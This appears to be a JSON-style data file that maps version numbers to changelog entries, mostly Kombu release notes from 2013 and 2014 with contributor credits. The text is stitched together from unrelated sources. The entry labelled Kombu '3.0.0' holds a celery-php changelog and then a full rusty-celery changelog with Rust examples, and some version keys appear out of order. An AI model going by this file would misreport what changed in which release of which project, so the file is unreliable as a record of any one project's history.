set correctly for all transports.\n\n    Contributed by Alex Koshelev.\n\n- qpid: Fixed bug where the connectionw as not being closed properly.\n\n    Contributed by Brian Bouterse.\n\n- :class:`~kombu.entity.bindings` is now JSON serializable (Issue 453).\n\n    Contributed by Sergey Tikhonov.\n\n- Fixed typo in error when yaml is not installed (said ``msgpack``).\n\n    Contributed by Joshua Harlow.\n\n- Redis: Now properly handles :exc:`redis.exceptions.TimeoutError`\n  raised by :mod:`redis`.\n\n    Contributed by markow.\n\n- qpid: Adds additional string to check for when connecting to qpid.\n\n    When we connect to qpid, we need to ensure that we skip to the next SASL\n    mechanism if the current mechanism fails. Otherwise, we will keep retrying the\n    connection with a non-working mech.\n\n    Contributed by Chris Duryee.\n\n- qpid: Handle ``NotFound`` exceptions.\n\n    Contributed by Brian Bouterse.\n\n- :class:`Queue.__repr__` now makes sure return value is not unicode\n  (Issue 440).\n\n- qpid: ``Queue.purge`` incorrectly raised :exc:`AttributeErrror` if the\n  does not exist (Issue 439).\n\n    Contributed by Brian Bouterse.\n\n- Linux: Now ignores permission errors on epoll unregister.\n\n.. _`RabbitMQ per-message TTL extension`: https://www.rabbitmq.com/ttl.html\n\n.. _version-3.0.24:\n\n", "3.0.24": "======\n:release-date: 2014-11-17 11:00 P.M UTC\n:release-by: Ask Solem\n\n- The `Qpid <http://qpid.apache.org/>`_ broker is supported for Python 2.x\n  environments. The Qpid transport includes full SSL support within Kombu. See\n  the :mod:`kombu.transport.qpid` docs for more info.\n\n    Contributed by Brian Bouterse and Chris Duryee through support from Red Hat.\n\n- Dependencies: extra[librabbitmq] now requires librabbitmq 1.6.0\n\n- Docstrings for :class:`~kombu.utils.limit.TokenBucket` did not match\n  implementation.\n\n    Fix contributed by Jesse Dhillon.\n\n- :func:`~kombu.common.oid_from` accidentally called ``uuid.getnode()`` but\n  did not use the return value.\n\n    Fix contributed by Alexander Todorov.\n\n- Redis: Now ignores errors when cosing the underlying connection.\n\n- Redis: Restoring messages will now use a single connection.\n\n- ``kombu.five.monotonic``: Can now be imported even if ctypes is not\n  available for some reason (e.g. App Engine)\n\n- Documentation: Improved example to use the ``declare`` argument to\n  ``Producer`` (Issue 423).\n\n- Django: Fixed ``app_label`` for older Django versions (``< 1.7``).\n  (Issue 414).\n\n.. _version-3.0.23:\n\n", "3.0.23": "======\n:release-date: 2014-09-14 10:45 P.M UTC\n:release-by: Ask Solem\n\n- Django: Fixed bug in the Django 1.7 compatibility improvements related\n  to autocommit handling.\n\n    Contributed by Radek Czajka.\n\n- Django: The Django transport models would not be created on syncdb\n  after app label rename (Issue 406).\n\n.. _version-3.0.22:\n\n", "3.0.22": "======\n:release-date: 2014-09-04 03:00 P.M UTC\n:release-by: Ask Solem\n\n- kombu.async: Min. delay between waiting for timer was always increased to\n  one second.\n\n- Fixed bug in itermessages where message is received after the with\n  statement exits the block.\n\n    Fixed by Rumyana Neykova\n\n- Connection.autoretry: Now works with functions missing wrapped attributes\n    (``__module__``, ``__name__``, ``__doc__``).  Fixes 392.\n\n    Contributed by johtso.\n\n- Django: Now sets custom app label for ``kombu.transport.django`` to work\n  with recent changes in Django 1.7.\n\n- SimpleQueue removed messages from the wrong end of buffer (Issue 380).\n\n- Tests: Now using ``unittest.mock`` if available (Issue 381).\n\n.. _version-3.0.21:\n\n", "3.0.21": "======\n:release-date: 2014-07-07 02:00 P.M UTC\n:release-by: Ask Solem\n\n- Fixed remaining bug in ``maybe_declare`` for ``auto_delete`` exchanges.\n\n    Fix contributed by Roger Hu.\n\n- MongoDB: Creating a channel now properly evaluates a connection (Issue 363).\n\n    Fix contributed by Len Buckens.\n\n.. _version-3.0.20:\n\n", "3.0.20": "======\n:release-date: 2014-06-24 02:30 P.M UTC\n:release-by: Ask Solem\n\n- Reverts change in 3.0.17 where ``maybe_declare`` caches the declaration\n  of auto_delete queues and exchanges.\n\n    Fix contributed by Roger Hu.\n\n- Redis: Fixed race condition when using gevent and the channel is closed.\n\n    Fix contributed by Andrew Rodionoff.\n\n.. _version-3.0.19:\n\n", "3.0.19": "======\n:release-date: 2014-06-09 03:10 P.M UTC\n:release-by: Ask Solem\n\n- The wheel distribution did not support Python 2.6 by failing to list\n  the extra dependencies required.\n\n- Durable and auto_delete queues/exchanges can be be cached using\n  ``maybe_declare``.\n\n.. _version-3.0.18:\n\n", "3.0.18": "======\n:release-date: 2014-06-02 06:00 P.M UTC\n:release-by: Ask Solem\n\n- A typo introduced in 3.0.17 caused kombu.async.hub to crash (Issue 360).\n\n.. _version-3.0.17:\n\n", "3.0.17": "======\n:release-date: 2014-06-02 05:00 P.M UTC\n:release-by: Ask Solem\n\n- ``kombu[librabbitmq]`` now depends on librabbitmq 1.5.2.\n\n- Async: Event loop now selectively removes file descriptors for the mode\n  it failed in, and keeps others (e.g read vs write).\n\n    Fix contributed by Roger Hu.\n\n- CouchDB: Now works without userid set.\n\n    Fix contributed by Latitia M. Haskins.\n\n- SQLAlchemy: Now supports recovery from connection errors.\n\n    Contributed by Felix Schwarz.\n\n- Redis: Restore at shutdown now works when ack emulation is disabled.\n\n- :func:`kombu.common.eventloop` accidentally swallowed socket errors.\n\n- Adds :func:`kombu.utils.url.sanitize_url`\n\n.. _version-3.0.16:\n\n", "3.0.16": "======\n:release-date: 2014-05-06 01:00 P.M UTC\n:release-by: Ask Solem\n\n- ``kombu[librabbitmq]`` now depends on librabbitmq 1.5.1.\n\n- Redis: Fixes ``TypeError`` problem in ``unregister`` (Issue 342).\n\n    Fix contributed by Tobias Schottdorf.\n\n- Tests: Some unit tests accidentally required the `redis-py` library.\n\n    Fix contributed by Randy Barlow.\n\n- librabbitmq: Would crash when using an older version of :mod:`librabbitmq`,\n  now emits warning instead.\n\n.. _version-3.0.15:\n\n", "3.0.15": "======\n:release-date: 2014-04-15 09:00 P.M UTC\n:release-by: Ask Solem\n\n- Now depends on :mod:`amqp` 1.4.5.\n\n- RabbitMQ 3.3 changes QoS semantics (Issue 339).\n\n    See the RabbitMQ release notes here:\n    http://www.rabbitmq.com/blog/2014/04/02/breaking-things-with-rabbitmq-3-3/\n\n    A new connection property has been added that can be used to detect\n    whether the remote server is using this new QoS behavior:\n\n    .. code-block:: pycon\n\n        >>> Connection('amqp://').qos_behavior_matches_spec\n        False\n\n    so if your application depends on the old semantics you can\n    use this to set the ``apply_global`` flag appropriately:\n\n    .. code-block:: python\n\n        def update_prefetch_count(channel, new_value):\n            channel.basic_qos(\n                0, new_value,\n                not channel.connection.client.qos_behavior_matches_spec,\n            )\n\n- Users of :mod:`librabbitmq` is encouraged to upgrade to librabbitmq 1.5.0.\n\n    The ``kombu[librabbitmq]`` extra has been updated to depend on this\n    version.\n\n- Pools: Now takes transport options into account when comparing connections\n  (Issue 333).\n\n- MongoDB: Fixes Python 3 compatibility.\n\n- Async: select: Ignore socket errors when attempting to unregister handles\n  from the loop.\n\n- Pidbox: Can now be configured to use a serializer other than json,\n  but specifying a serializer argument to :class:`~kombu.pidbox.Mailbox`.\n\n    Contributed by Dmitry Malinovsky.\n\n- Message decompression now works with Python 3.\n\n    Fix contributed by Adam Gaca.\n\n.. _version-3.0.14:\n\n", "3.0.14": "======\n:release-date: 2014-03-19 07:00 P.M UTC\n:release-by: Ask Solem\n\n- **MongoDB**: Now endures a connection failover (Issue 123).\n\n    Fix contributed by Alex Koshelev.\n\n- **MongoDB**: Fixed ``KeyError`` when a replica set member is removed.\n\n    Also fixes celery971 and celery/898.\n\n    Fix contributed by Alex Koshelev.\n\n- **MongoDB**: Fixed MongoDB broadcast cursor re-initialization bug.\n\n    Fix contributed by Alex Koshelev.\n\n- **Async**: Fixed bug in lax semaphore implementation where in\n  some usage patterns the limit was not honored correctly.\n\n    Fix contributed by Ionel Cristian M\u0103rie\u0219.\n\n- **Redis**: Fixed problem with fanout when using Python 3 (Issue 324).\n\n- **Redis**: Fixed ``AttributeError`` from attempting to close a non-existing\n  connection (Issue 320).\n\n.. _version-3.0.13:\n\n", "3.0.13": "======\n:release-date: 2014-03-03 04:00 P.M UTC\n:release-by: Ask Solem\n\n- Redis: Fixed serious race condition that could lead to data loss.\n\n    The delivery tags were accidentally set to be an incremental number\n    local to the channel, but the delivery tags need to be globally\n    unique so that a message can not overwrite an older message\n    in the backup store.\n\n    This change is not backwards incompatible and you are encouraged\n    to update all your system using a previous version as soon as possible.\n\n- Now depends on :mod:`amqp` 1.4.4.\n\n- Pidbox: Now makes sure message encoding errors are handled by default,\n  so that a custom error handler does not need to be specified.\n\n- Redis: The fanout exchange can now use AMQP patterns to route and filter\n  messages.\n\n    This change is backwards incompatible and must be enabled with\n    the ``fanout_patterns`` transport option:\n\n    .. code-block:: pycon\n\n        >>> conn = kombu.Connection('redis://', transport_options={\n        ...     'fanout_patterns': True,\n        ... })\n\n    When enabled the exchange will work like an amqp topic exchange\n    if the binding key is a pattern.\n\n    This is planned to be default behavior in the future.\n\n- Redis: Fixed ``cycle`` no such attribute error.\n\n.. _version-3.0.12:\n\n", "3.0.12": "======\n:release-date: 2014-02-09 03:50 P.M UTC\n:release-by: Ask Solem\n\n- Now depends on :mod:`amqp` 1.4.3.\n\n- Fixes Python 3.4 logging incompatibility (Issue 311).\n\n- Redis: Now properly handles unknown pub/sub messages.\n\n    Fix contributed by Sam Stavinoha.\n\n- amqplib: Fixed bug where more bytes were requested from the socket\n  than necessary.\n\n    Fix contributed by Ionel Cristian M\u0103rie\u0219.\n\n.. _version-3.0.11:\n\n", "3.0.11": "======\n:release-date: 2014-02-03 05:00 P.M UTC\n:release-by: Ask Solem\n\n- Now depends on :mod:`amqp` 1.4.2.\n\n- Now always trusts messages of type `application/data` and `application/text`\n  or which have an unspecified content type (Issue 306).\n\n- Compression errors are now handled as decode errors and will trigger\n  the ``Consumer.on_decode_error`` callback if specified.\n\n- New ``kombu.Connection.get_heartbeat_interval()`` method that can be\n  used to access the negotiated heartbeat value.\n\n- `kombu.common.oid_for` no longer uses the MAC address of the host, but\n   instead uses a process-wide UUID4 as a node id.\n\n    This avoids a call to `uuid.getnode()` at module scope.\n\n- Hub.add: Now normalizes registered fileno.\n\n    Contributed by Ionel Cristian M\u0103rie\u0219.\n\n- SQS: Fixed bug where the prefetch count limit was not respected.\n\n.. _version-3.0.10:\n\n", "3.0.10": "======\n:release-date: 2014-01-17 05:40 P.M UTC\n:release-by: Ask Solem\n\n- Now depends on :mod:`amqp` 1.4.1.\n\n- ``maybe_declare`` now raises a \"recoverable connection error\" if\n  the channel is disconnected instead of a :exc:`ChannelError` so that\n  the operation can be retried.\n\n- Redis: ``Consumer.cancel()`` is now thread safe.\n\n    This fixes an issue when using gevent/eventlet and a\n    message is handled after the consumer is canceled resulting\n    in a \"message for queue without consumers\" error.\n\n- Retry operations would not always respect the interval_start\n  value when calculating the time to sleep for (Issue 303).\n\n    Fix contributed by Antoine Legrand.\n\n- Timer: Fixed \"unhashable type\" error on Python 3.\n\n- Hub: Do not attempt to unregister operations on an already closed\n  poller instance.\n\n.. _version-3.0.9:\n\n", "3.0.9": "=====\n:release-date: 2014-01-13 05:30 P.M UTC\n:release-by: Ask Solem\n\n- Now depends on :mod:`amqp` 1.4.0.\n\n- Redis: Basic cancel for fanout based queues now sends a corresponding\n  ``UNSUBSCRIBE`` command to the server.\n\n    This fixes an issue with pidbox where reply messages could be received\n    after the consumer was canceled, giving the ``\"message to queue without\n    consumers\"`` error.\n\n- MongoDB: Improved connection string and options handling\n  (Issue 266 + Issue 120).\n\n    Contributed by Alex Koshelev.\n\n- SQS: Limit the number of messages when receiving in batch to 10.\n\n    This is a hard limit enforced by Amazon so the sqs transport\n    must not exceeed this value.\n\n    Fix contributed by Eric Reynolds.\n\n- ConsumerMixin: ``consume`` now checks heartbeat every time the\n  socket times out.\n\n    Contributed by Dustin J. Mitchell.\n\n- Retry Policy: A max retries of 0 did not retry forever.\n\n    Fix contributed by Antoine Legrand.\n\n- Simple: If passing a Queue object the simple utils will now take\n  default routing key from that queue.\n\n    Contributed by Fernando Jorge Mota.\n\n- ``repr(producer)`` no longer evaluates the underlying channnel.\n\n- Redis: The map of Redis error classes are now exposed at the module level\n  using the :func:`kombu.transport.redis.get_redis_error_classes` function.\n\n- Async: ``Hub.close`` now sets ``.poller`` to None.\n\n.. _version-3.0.8:\n\n", "3.0.8": "=====\n:release-date: 2013-12-16 05:00 P.M UTC\n:release-by: Ask Solem\n\n- Serializer: loads and dumps now wraps exceptions raised into\n  :exc:`~kombu.exceptions.DecodeError` and\n  :exc:`kombu.exceptions.EncodeError` respectively.\n\n    Contributed by Ionel Cristian Maries\n\n- Redis: Would attempt to read from the wrong connection if a select/epoll/kqueue\n  exception event happened.\n\n    Fix contributed by Michael Nelson.\n\n- Redis: Disabling ack emulation now works properly.\n\n    Fix contributed by Michael Nelson.\n\n- Redis: :exc:`IOError` and :exc:`OSError` are now treated as recoverable\n  connection errors.\n\n- SQS: Improved performance by reading messages in bulk.\n\n    Contributed by Matt Wise.\n\n- Connection Pool: Attempting to acquire from a closed pool will now\n  raise :class:`RuntimeError`.\n\n.. _version-3.0.7:\n\n", "3.0.7": "=====\n:release-date: 2013-12-02 04:00 P.M UTC\n:release-by: Ask Solem\n\n- Fixes Python 2.6 compatibility.\n\n- Redis: Fixes 'bad file descriptor' issue.\n\n.. _version-3.0.6:\n\n", "3.0.6": "=====\n:release-date: 2013-11-21 04:50 P.M UTC\n:release-by: Ask Solem\n\n- Timer: No longer attempts to hash keyword arguments (Issue 275).\n\n- Async: Did not account for the long type for file descriptors.\n\n    Fix contributed by Fabrice Rabaute.\n\n- PyPy: kqueue support was broken.\n\n- Redis: Bad pub/sub payloads no longer crashes the consumer.\n\n- Redis: Unix socket URLs can now specify a virtual host by including\n  it as a query parameter.\n\n    Example URL specifying a virtual host using database number 3:\n\n    .. code-block:: text\n\n        redis+socket:///tmp/redis.sock?virtual_host=3\n\n- ``kombu.VERSION`` is now a named tuple.\n\n.. _version-3.0.5:\n\n", "3.0.5": "=====\n:release-date: 2013-11-15 11:00 P.M UTC\n:release-by: Ask Solem\n\n- Now depends on :mod:`amqp` 1.3.3.\n\n- Redis: Fixed Python 3 compatibility problem (Issue 270).\n\n- MongoDB: Fixed problem with URL parsing when authentication used.\n\n    Fix contributed by dongweiming.\n\n- pyamqp: Fixed small issue when publishing the message and\n  the property dictionary was set to None.\n\n    Fix contributed by Victor Garcia.\n\n- Fixed problem in ``repr(LaxBoundedSemaphore)``.\n\n    Fix contributed by Antoine Legrand.\n\n- Tests now passing on Python 3.3.\n\n.. _version-3.0.4:\n\n", "3.0.4": "=====\n:release-date: 2013-11-08 01:00 P.M UTC\n:release-by: Ask Solem\n\n- common.QoS: ``decrement_eventually`` now makes sure the value\n  does not go below 1 if a prefetch count is enabled.\n\n.. _version-3.0.3:\n\n", "3.0.3": "=====\n:release-date: 2013-11-04 03:00 P.M UTC\n:release-by: Ask Solem\n\n- SQS: Properly reverted patch that caused delays between messages.\n\n    Contributed by James Saryerwinnie\n\n- select: Clear all registerd fds on poller.cloe\n\n- Eventloop: unregister if EBADF raised.\n\n.. _version-3.0.2:\n\n", "3.0.2": "=====\n:release-date: 2013-10-29 02:00 P.M UTC\n:release-by: Ask Solem\n\n- Now depends on :mod:`amqp` version 1.3.2.\n\n- select: Fixed problem where unregister did not properly remove\n  the fd.\n\n.. _version-3.0.1:\n\n", "3.0.1": "=====\n:release-date: 2013-10-24 04:00 P.M UTC\n:release-by: Ask Solem\n\n- Now depends on :mod:`amqp` version 1.3.1.\n\n- Redis: New option ``fanout_keyprefix``\n\n    This transport option is recommended for all users as it ensures\n    that broadcast (fanout) messages sent is only seen by the current\n    virtual host:\n\n    .. code-block:: python\n\n        Connection('redis://', transport_options={'fanout_keyprefix': True})\n\n    However, enabling this means that you cannot send or receive messages\n    from older Kombu versions so make sure all of your participants\n    are upgraded and have the transport option enabled.\n\n    This will be the default behavior in Kombu 4.0.\n\n- Distribution: Removed file ``requirements/py25.txt``.\n\n- MongoDB: Now disables ``auto_start_request``.\n\n- MongoDB: Enables ``use_greenlets`` if eventlet/gevent used.\n\n- Pidbox: Fixes problem where expires header was None,\n  which is a value not supported by the amq protocol.\n\n- ConsumerMixin: New ``consumer_context`` method for starting\n  the consumer without draining events.\n\n.. _version-3.0.0:\n\n", "3.0.0": "- **Removed support for PHP 5.3.**\n- celery-php now uses a PSR-4 compliant namespace, `Celery`. To migrate to the\n  new version, change code from `new Celery(\u2026)` to `new \\Celery\\Celery(\u2026)`.\n- Now supports php-amqplib/php-amqplib for the amqplib backend as\n  videlalvaro/php-amqplib is abandoned.\n- Fix crash with the ampqlib backend when Celery has not yet created the\n  results exchange.\n- The `Celery` constructor no longer accepts the argument\n  `persistent_messages`. It was previously unused.\n- celery-php now uses Celery task protocol version 2 and requires Celery 4.0+.\n\n\n Changelog\n\nAll notable changes to this project will be documented in this file.\n\nThe format is based on [Keep a Changelog](https://keepachangelog.com/en/1.0.0/),\nand this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).\n\n Unreleased\n\n [v0.5.5](https://github.com/rusty-celery/rusty-celery/releases/tag/v0.5.5) - 2023-09-25\n\n Fixed\n\n- Replaced unnecessary `println!` with `log::info!`.\n\n [v0.5.4](https://github.com/rusty-celery/rusty-celery/releases/tag/v0.5.4) - 2023-09-11\n\n Fixed\n\n- Skip warning about redis heartbeat when not necessary.\n\n [v0.5.3](https://github.com/rusty-celery/rusty-celery/releases/tag/v0.5.3) - 2023-02-28\n\n Fixed\n\n- `BrokerBuilder` is now `Send + Sync`.\n\n [v0.5.2](https://github.com/rusty-celery/rusty-celery/releases/tag/v0.5.2) - 2023-02-20\n\n Changed\n\n- Store a reference to the Celery app in Request.\n\n Fixed\n\n- Fixed compilation issue on Windows.\n\n [v0.5.1](https://github.com/rusty-celery/rusty-celery/releases/tag/v0.5.1) - 2023-02-16\n\n Fixed\n\n- Bumped base64 to it's latest and safest version\n- Bumped tokio to it's latest version\n- Bumped rmp-serde to it's latest version\n- Bumped serde_yaml to it's latest version\n- Bumped uuid to it's latest version\n- Bumped once_cell to it's latest version\n- Bumped redis to it's latest version\n- Bumped env_logger to it's latest version\n- Bumped mypy to it's latest version\n- Bumped black to it's latest version\n- Bumped flake8 to it's latest version\n\n [v0.5.0](https://github.com/rusty-celery/rusty-celery/releases/tag/v0.5.0) - 2023-02-14\n\n Changed\n\n- Changed Celery type to be broker agnostic, allowing broker to be chosen dynamically at runtime.\n\n [v0.4.0](https://github.com/rusty-celery/rusty-celery/releases/tag/v0.4.0) - 2023-02-03\n\n Fixed\n\n- Bumped Lapin to it's latest and safest version\n- Bumped black to it's latest version, since current was breaking\n\n Added\n\n- Add explicit feature support for rustls/native-tls\n\n [v0.4.0-rcn.11](https://github.com/rusty-celery/rusty-celery/releases/tag/v0.4.0-rcn.11) - 2021-10-07\n\n Fixed\n\n- Fixed SemVer ordering.\n\n [v0.4.0-rc10](https://github.com/rusty-celery/rusty-celery/releases/tag/v0.4.0-rc10) - 2021-08-30\n\n Fixed\n\n- Fixed another bug with the `app!` and `beat!` related to issue [250](https://github.com/rusty-celery/rusty-celery/issues/250).\n\n [v0.4.0-rc8](https://github.com/rusty-celery/rusty-celery/releases/tag/v0.4.0-rc8) - 2021-08-05\n\n Changed\n\n- \u26a0\ufe0f **BREAKING CHANGE** \u26a0\ufe0f\n\n  The `RegularSchedule` in the `beat` module has been renamed to `DeltaSchedule` to\n  be more coherent with Python Celery terminology, where it is sometimes called *timedelta*.\n- Tokio updated to 1.0.0.\n- The `Broker::configure_task_routes` produces `BrokerError` instead of `CeleryError`.\n- The `beat` macro now expects a list of tasks that is used to initialize the scheduler.\n- Errors have been refactored:\n   * The `BadRoutingPattern` variant has been moved from `CeleryError` to `BrokerError`;\n   * The `CronScheduleError` has been replaced by a `ScheduleError` enum with a `CronScheduleError` variant;\n   * A `ScheduleError` variant has been added to `BeatError`\n   * A `BadRoutingPattern` error has been added.\n\n Added\n\n- \ud83d\ude80\ud83d\ude80 Redis broker support \ud83d\ude80\ud83d\ude80\n- Added the `max_sleep_duration` property on the `Beat` which can be used to ensure that\n  the scheduler backend is called regularly (which may be necessary for custom backends).\n- Added a method `Beat::schedule_named_task` to add a scheduled task with a custom name.\n- Added a method `Broker::cancel` to cancel an existing consumer.\n- Changed `Ok` variant type of the the return type of `Broker::consume`. This is now a tuple that includes a unique\n  consumer tag that can then be passed to `Broker::cancel` to cancel the corresponding consumer.\n- Added a \"coverage\" job to GitHub Actions.\n- Completed MessageBuilder struct\n\n Fixed\n\n- Fixed a bug with `AMQPBroker::close()` that would result in an error with `lapin`.\n- Fixed a bug with the `celery::app!` macro that caused it to fail to compile when the broker connection string was passed as a variable instead of an expression.\n\n [v0.4.0-rc5](https://github.com/rusty-celery/rusty-celery/releases/tag/v0.4.0-rc5) - 2020-11-19\n\n Added\n\n- Added the `CronSchedule` struct to support Celery's\n  [crontab](https://docs.celeryproject.org/en/stable/reference/celery.schedules.html#celery.schedules.crontab)\n  schedules.\n\n Changed\n\n- \u26a0\ufe0f **BREAKING CHANGE** \u26a0\ufe0f\n\n  To improve the `app!` and `beat!` macros and accommodate custom `Broker`s and `SchedulerBackend`s,\n  we've had to make breaking changes to the way these macros are invoked.\n\n  The biggest change is that the macros now return a future of `Result<Celery>` or `Result<Beat>`.\n  This means you must now call `.await?` on the return value of the macro.\n\n  The other change is that you must now supply the actual `Broker` type.\n  Previously, you could write something like `broker = AMQP { \"amqp://my-broker-url\" }`,\n  but now you have to write it like `broker = celery::broker::AMQPBroker { \"amqp://my-broker-url\" }`.\n\n  For a concrete example of these changes, the old way looked like this:\n\n\n  ```rust\n  [tokio::main]\n  async fn main() -> anyhow::Result<()> {\n      let app = celery::app!(\n          broker = AMQP { \"amqp://my-broker-url\" },\n          tasks = [add],\n          task_routes = [\"*\" => \"celery\"],\n      );\n\n      // ...\n\n      Ok(())\n  }\n  ```\n\n  Whereas now that will look like this:\n\n  ```rust\n  [tokio::main]\n  async fn main() -> anyhow::Result<()> {\n      let app = celery::app!(\n          broker = celery::broker::AMQPBroker { \"amqp://my-broker-url\" },\n          tasks = [add],\n          task_routes = [\"*\" => \"celery\"],\n      ).await?;\n\n      // ...\n\n      Ok(())\n  }\n  ```\n\n- Celery apps no longer need to have static lifetimes. To remove this constraint, we changed\n  `Celery::consume` to take `&Arc<Self>` instead of a static reference to `self`.\n- Now using `tokio-amqp` internally with `lapin`.\n- Drop explicit dependency on amq-protocol.\n\n Fixed\n\n- Task ID now logged when a beat app sends a task.\n- Fixes to docs. Added a \"Build Docs\" job to GitHub Actions.\n- Fixed a Celery beat [issue](https://github.com/rusty-celery/rusty-celery/issues/199)\n  that caused a task to be dropped if its scheduled run was delayed\n\n", "2.5.16": "======\n:release-date: 2013-10-04 03:30 P.M BST\n:release-by: Ask Solem\n\n- Python 3: Fixed problem with dependencies not being installed.\n\n.. _version-2.5.15:\n\n", "2.5.15": "======\n:release-date: 2013-10-04 03:30 P.M BST\n:release-by: Ask Solem\n\n- Declaration cache: Now only keeps hash of declaration\n  so that it does not keep a reference to the channel.\n\n- Declaration cache: Now respects ``entity.can_cache_declaration``\n  attribute.\n\n- Fixes Python 2.5 compatibility.\n\n- Fixes tests after python-msgpack changes.\n\n- ``Queue.get``: Now supports ``accept`` argument.\n\n.. _version-2.5.14:\n\n", "2.5.14": "======\n:release-date: 2013-08-23 05:00 P.M BST\n:release-by: Ask Solem\n\n- safe_str did not work properly resulting in\n  :exc:`UnicodeDecodeError` (Issue 248).\n\n.. _version-2.5.13:\n\n", "2.5.13": "======\n:release-date: 2013-08-16 04:00 P.M BST\n:release-by: Ask Solem\n\n- Now depends on :mod:`amqp` 1.0.13\n\n- Fixed typo in Django functional tests.\n\n- safe_str now returns Unicode in Python 2.x\n\n    Fix contributed by Germ\u00e1n M. Bravo.\n\n- amqp: Transport options are now merged with arguments\n  supplied to the connection.\n\n- Tests no longer depends on distribute, which was deprecated\n  and merged back into setuptools.\n\n    Fix contributed by Sascha Peilicke.\n\n- ConsumerMixin now also restarts on channel related errors.\n\n    Fix contributed by Corentin Ardeois.\n\n.. _version-2.5.12:\n\n", "2.5.12": "======\n:release-date: 2013-06-28 03:30 P.M BST\n:release-by: Ask Solem\n\n- Redis: Ignore errors about keys missing in the round-robin cycle.\n\n- Fixed test suite errors on Python 3.\n\n- Fixed msgpack test failures.\n\n.. _version-2.5.11:\n\n", "2.5.11": "======\n:release-date: 2013-06-25 02:30 P.M BST\n:release-by: Ask Solem\n\n- Now depends on amqp 1.0.12 (Py3 compatibility issues).\n\n- MongoDB:  Removed cause of a \"database name in URI is being ignored\"\n  warning.\n\n    Fix by Flavio Percoco Premoli\n\n- Adds ``passive`` option to :class:`~kombu.Exchange`.\n\n    Setting this flag means that the exchange will not be declared by kombu,\n    but that it must exist already (or an exception will be raised).\n\n    Contributed by Rafal Malinowski\n\n- Connection.info() now gives the current hostname and not the list of\n  available hostnames.\n\n    Fix contributed by John Shuping.\n\n- pyamqp: Transport options are now forwarded as kwargs to ``amqp.Connection``.\n\n- librabbitmq: Transport options are now forwarded as kwargs to\n  ``librabbitmq.Connection``.\n\n- librabbitmq:  Now raises :exc:`NotImplementedError` if SSL is enabled.\n\n    The librabbitmq library does not support ssl,\n    but you can use stunnel or change to the ``pyamqp://`` transport\n    instead.\n\n    Fix contributed by Dan LaMotte.\n\n- librabbitmq: Fixed a cyclic reference at connection close.\n\n- eventio: select implementation now removes bad file descriptors.\n\n- eventio: Fixed Py3 compatibility problems.\n\n- Functional tests added for py-amqp and librabbitmq transports.\n\n- Resource.force_close_all no longer uses a mutex.\n\n- Pidbox: Now ignores `IconsistencyError` when sending replies,\n  as this error simply means that the client may no longer be alive.\n\n- Adds new :meth:`Connection.collect <~kombu.Connection.collect>` method,\n  that can be used to clean up after connections without I/O.\n\n- ``queue_bind`` is no longer called for queues bound to\n  the \"default exchange\" (Issue 209).\n\n    Contributed by Jonathan Halcrow.\n\n- The max_retries setting for retries was not respected correctly (off by one).\n\n.. _version-2.5.10:\n\n", "2.5.10": "======\n:release-date: 2013-04-11 06:10 P.M BST\n:release-by: Ask Solem\n\n", "3.0": "-----------------------------------------\n\nKombu 3 consumers will no longer accept pickle/yaml or msgpack\nby default, and you will have to explicitly enable untrusted deserializers\neither globally using :func:`kombu.enable_insecure_serializers`, or\nusing the ``accept`` argument to :class:`~kombu.Consumer`.\n\nChanges\n-------\n\n- New utility function to disable/enable untrusted serializers.\n\n      - :func:`kombu.disable_insecure_serializers`\n      - :func:`kombu.enable_insecure_serializers`.\n\n- Consumer: ``accept`` can now be used to specify a whitelist\n  of content types to accept.\n\n    If the accept whitelist is set and a message is received\n    with a content type that is not in the whitelist then a\n    :exc:`~kombu.exceptions.ContentDisallowed` exception\n    is raised.  Note that this error can be handled by the already\n    existing `on_decode_error` callback\n\n    Examples:\n\n    .. code-block:: python\n\n        Consumer(accept=['application/json'])\n        Consumer(accept=['pickle', 'json'])\n\n- Now depends on amqp 1.0.11\n\n- pidbox: Mailbox now supports the ``accept`` argument.\n\n- Redis: More friendly error for when keys are missing.\n\n- Connection URLs: The parser did not work well when there were\n  multiple '+' tokens.\n\n.. _version-2.5.9:\n\n", "2.5.9": "=====\n:release-date: 2013-04-08 05:07 P.M BST\n:release-by: Ask Solem\n\n- Pidbox: Now warns if there are multiple nodes consuming from\n  the same pidbox.\n\n- Adds :attr:`Queue.on_declared <kombu.Queue.on_declared>`\n\n    A callback to be called when the queue is declared,\n    with signature ``(name, messages, consumers)``.\n\n- Now uses fuzzy matching to suggest alternatives to typos in transport\n  names.\n\n- SQS: Adds new transport option ``queue_prefix``.\n\n    Contributed by j0hnsmith.\n\n- pyamqp: No longer overrides verify_connection.\n\n- SQS: Now specifies the ``driver_type`` and ``driver_name``\n  attributes.\n\n    Fix contributed by Mher Movsisyan.\n\n- Fixed bug with ``kombu.utils.retry_over_time`` when no errback\n  specified.\n\n\n.. _version-2.5.8:\n\n", "2.5.8": "=====\n:release-date: 2013-03-21 04:00 P.M UTC\n:release-by: Ask Solem\n\n- Now depends on :mod:`amqp` 1.0.10 which fixes a Python 3 compatibility error.\n\n- Redis: Fixed a possible race condition (Issue 171).\n\n- Redis: Ack emulation/visibility_timeout can now be disabled\n  using a transport option.\n\n    Ack emulation adds quite a lot of overhead to ensure data is safe\n    even in the event of an unclean shutdown.  If data loss do not worry\n    you there is now an `ack_emulation` transport option you can use\n    to disable it:\n\n    .. code-block:: python\n\n        Connection('redis://', transport_options={'ack_emulation': False})\n\n- SQS: Fixed :mod:`boto` v2.7 compatibility (Issue 207).\n\n- Exchange: Should not try to re-declare default exchange (``\"\"``)\n  (Issue 209).\n\n- SQS: Long polling is now disabled by default as it was not\n  implemented correctly, resulting in long delays between receiving\n  messages (Issue 202).\n\n- Fixed Python 2.6 incompatibility depending on ``exc.errno``\n  being available.\n\n    Fix contributed by Ephemera.\n\n.. _version-2.5.7:\n\n", "2.5.7": "=====\n:release-date: 2013-03-08 01:00 P.M UTC\n:release-by: Ask Solem\n\n- Now depends on amqp 1.0.9\n\n- Redis: A regression in 2.5.6 caused the redis transport to\n  ignore options set in ``transport_options``.\n\n- Redis: New ``socket_timeout`` transport option.\n\n- Redis: ``InconsistencyError`` is now regarded as a recoverable error.\n\n- Resource pools: Will no longer attempt to release resource\n  that was never acquired.\n\n- MongoDB: Now supports the ``ssl`` option.\n\n    Contributed by Sebastian Pawlus.\n\n.. _version-2.5.6:\n\n", "2.5.6": "=====\n:release-date: 2013-02-08 01:00 P.M UTC\n:release-by: Ask Solem\n\n- Now depends on amqp 1.0.8 which works around a bug found on some\n  Python 2.5 installations where 2**32 overflows to 0.\n\n.. _version-2.5.5:\n\n", "2.5.5": 